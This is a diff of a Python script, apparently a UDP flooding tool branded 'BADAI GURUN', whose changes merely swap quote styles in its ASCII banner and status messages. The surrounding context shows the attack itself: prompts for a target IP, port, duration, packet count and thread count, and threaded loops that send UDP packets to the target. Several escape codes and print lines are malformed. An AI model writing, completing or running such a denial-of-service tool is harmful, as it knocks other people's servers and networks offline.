@@ -8,39 +8,39 @@ import random
 
 
 # Clear terminal screen
-os.system('clear')
+os.system("clear")
 
 # Funcion to display header
 def display_header():
     header_lines = (" ")
-print('\e[1;34m═══════════════════════════════════════════════════════════\033[0m')
-print('\e[1;34m\033[0m')
-print('\e[1;32m█▒\e[1;33m═╗\e[1;32m  █▒\e[1;33m═╗\e[1;32m █▒\e[1;33m═╗\e[1;32m   █▒\e[1;33m═╗\e[1;32m ██▒\e[1;32m══╗\e[1;32m   █▒\e[1;33m═╗\e[1;32m ██████▒\e[1;33m═╗\e[1;32m █▒\e[1;33m═╗\e[1;32m       █▒\e[1;33m═╗\033[0m')
-print('\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;32m █▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ╔════╝\e[1;32m   █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\033[0m')
-print('\e[1;32m█▒\e[1;33m ║\e[1;32m█▒\e[1;33m ║\e[1;32m   █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m          █▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\033[0m')
-print('\e[1;32m███▒\e[1;33m ║\e[1;32m     █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m            █▒\e[1;33m║\e[1;32m█▒\e[1;33m ║\033[0m')
-print('\e[1;32m█▒\e[1;33m ║\e[1;32m█▒\e[1;33m ║\e[1;32m   █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m  █▒\e[1;32m █▒\e[1;33m ║\e[1;32m █████▒\e[1;33m═╗\e[1;32m        ██▒\e[1;33m ║\033[0m')
-print('\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m   █▒\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ╔═══╝\e[1;32m         █▒\e[1;33m ║\033[0m')
-print('\e[1;32m█▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\e[1;32m   █████▒\e[1;33m══╝\e[1;32m █▒\e[1;33m ║\e[1;32m     ██▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m            █▒\e[1;33m ║\033[0m')
-print('\e[1;33m╚══╝  ╚══╝  ╚═══════╝ ╚═══╝    ╚═══╝ ╚══╝             ╚══╝\033[0m')
-print('\e[0;33m  ╔╗  ╔╗ ╔═══╗  ╔═══╗    ╔═══╗ ╔════╗╔════╗ ╔═══╗ ╔════╗ ╔╗   ╔\033[0m')
-print('\e[0;33m  ║║  ║║ ║║   ║ ║║   ║   ║║   ║   ║║     ║║   ║║   ║ ║║      ║║ ╝\033[0m')
-print('\e[0;33m  ╚╝  ╚╝ ║║   ║ ╚╚══╝    ╔╔══╗   ║║     ║║   ╔╔═══║ ║║      ║║ ╗\033[0m')
-print('\e[0;33m  ╚╚══╝  ╚╚══╝ ╚╝       ╚╝   ╚   ╚      ╚     ╚╝   ╚ ╚╚═══╝ ╚╝   ╚\033[0m')
-print('\e[0;33m\033[0m')
-print('\e[0;33m\033[0m')
-print('e\033[1;34m══════════════════════════════════════════════════════════\033[0m')
+print("\e[1;34m═══════════════════════════════════════════════════════════\033[0m")
+print("\e[1;34m\033[0m")
+print("\e[1;32m█▒\e[1;33m═╗\e[1;32m  █▒\e[1;33m═╗\e[1;32m █▒\e[1;33m═╗\e[1;32m   █▒\e[1;33m═╗\e[1;32m ██▒\e[1;32m══╗\e[1;32m   █▒\e[1;33m═╗\e[1;32m ██████▒\e[1;33m═╗\e[1;32m █▒\e[1;33m═╗\e[1;32m       █▒\e[1;33m═╗\033[0m")
+print("\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;32m █▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ╔════╝\e[1;32m   █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\033[0m")
+print("\e[1;32m█▒\e[1;33m ║\e[1;32m█▒\e[1;33m ║\e[1;32m   █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m          █▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\033[0m")
+print("\e[1;32m███▒\e[1;33m ║\e[1;32m     █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m            █▒\e[1;33m║\e[1;32m█▒\e[1;33m ║\033[0m")
+print("\e[1;32m█▒\e[1;33m ║\e[1;32m█▒\e[1;33m ║\e[1;32m   █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m  █▒\e[1;32m █▒\e[1;33m ║\e[1;32m █████▒\e[1;33m═╗\e[1;32m        ██▒\e[1;33m ║\033[0m")
+print("\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\e[1;32m    █▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m   █▒\e[1;32m█▒\e[1;33m ║\e[1;32m █▒\e[1;33m ╔═══╝\e[1;32m         █▒\e[1;33m ║\033[0m")
+print("\e[1;32m█▒\e[1;33m ║\e[1;32m  █▒\e[1;33m ║\e[1;32m   █████▒\e[1;33m══╝\e[1;32m █▒\e[1;33m ║\e[1;32m     ██▒\e[1;33m ║\e[1;32m █▒\e[1;33m ║\e[1;32m            █▒\e[1;33m ║\033[0m")
+print("\e[1;33m╚══╝  ╚══╝  ╚═══════╝ ╚═══╝    ╚═══╝ ╚══╝             ╚══╝\033[0m")
+print("\e[0;33m  ╔╗  ╔╗ ╔═══╗  ╔═══╗    ╔═══╗ ╔════╗╔════╗ ╔═══╗ ╔════╗ ╔╗   ╔\033[0m")
+print("\e[0;33m  ║║  ║║ ║║   ║ ║║   ║   ║║   ║   ║║     ║║   ║║   ║ ║║      ║║ ╝\033[0m")
+print("\e[0;33m  ╚╝  ╚╝ ║║   ║ ╚╚══╝    ╔╔══╗   ║║     ║║   ╔╔═══║ ║║      ║║ ╗\033[0m")
+print("\e[0;33m  ╚╚══╝  ╚╚══╝ ╚╝       ╚╝   ╚   ╚      ╚     ╚╝   ╚ ╚╚═══╝ ╚╝   ╚\033[0m")
+print("\e[0;33m\033[0m")
+print("\e[0;33m\033[0m")
+print("e\033[1;34m══════════════════════════════════════════════════════════\033[0m")
 
 # Prompt user for input
 def get_user_input():
-    print('e\1;35+======================================================\033[0m')
+    print("e\1;35+======================================================\033[0m")
     target_ip = input('\e[1;36m | Target IP : \033[0m').strip()
     target_port = input('\e[1;36 | Target Port : \033[0m').strip()
     attack_time = input('\e[1;36 | Time (seconds) : \033[0m').strip()
     packet = input('\e[1;36 | Packet : \033[0m').strip()
     thread_count = input('\e[1;36 | Thread : \033[0m').strip()
     method = input('\e[1;36 | Method (UDP/TCP & UDP Mix) : \033[0m').strip().lower()
-    print('e\1;35=======================================================\033[0m')
+    print("e\1;35=======================================================\033[0m")
 
     return target_ip, int(target_port), int(attack_time), int(packet), int(thread_count), method
 
@@ -66,11 +66,11 @@ def udp_attack(ip, port, packet, duration, thread_count):
         try:
             for _ in range(packet):
                 s.sendto(data, (ip, port))
-            print(f'  \e[1;37m:: \e[1;30mBADAI GURUN \e[0;31m= \e[0;37mUDP\e[0;33m~\e[0;33mATTACK \e[0;34m " +ip+ "\e[0;35mrunning\033[0m')
-            print(f'  \e[1;31m:: \e[1;33mBADAI GURUN \e[0;31m= \e[0;33mUDP\e[0;33m~\e[0;37mATTACK \e[0;33m " +ip+ "\e[1;31mrunning\033[0m')
+            print(f"  \e[1;37m:: \e[1;30mBADAI GURUN \e[0;31m= \e[0;37mUDP\e[0;33m~\e[0;33mATTACK \e[0;34m " +ip+ "\e[0;35mrunning\033[0m")
+            print(f"  \e[1;31m:: \e[1;33mBADAI GURUN \e[0;31m= \e[0;33mUDP\e[0;33m~\e[0;37mATTACK \e[0;33m " +ip+ "\e[1;31mrunning\033[0m")
         except socket.error:
             s.close()
-            print(f'  \e[1;33m:: \e[0;36mBADAI GURUN \e[0;34m= \e[0;31mUDP\e[0;33m~\e[0;371ATTACK \e[0;34m " +ip+ "\e[1;37mrunning\033[0m')
+            print(f"  \e[1;33m:: \e[0;36mBADAI GURUN \e[0;34m= \e[0;31mUDP\e[0;33m~\e[0;371ATTACK \e[0;34m " +ip+ "\e[1;37mrunning\033[0m")
             break
 
 # Threaded attack function
@@ -80,7 +80,7 @@ def start_attack(target_ip, target_port, packet, thread_count, method, duration)
             th = threading.Thread(target=udp_attack, args=(target_ip, target_port, packet, duration, thread_count))
             th.start()
     else:
-        print('[BADAI GURUN] Unsupported method. Only UDP supported in this version.')
+        print("[BADAI GURUN] Unsupported method. Only UDP supported in this version.")
 
 # Main program flow
 def main():
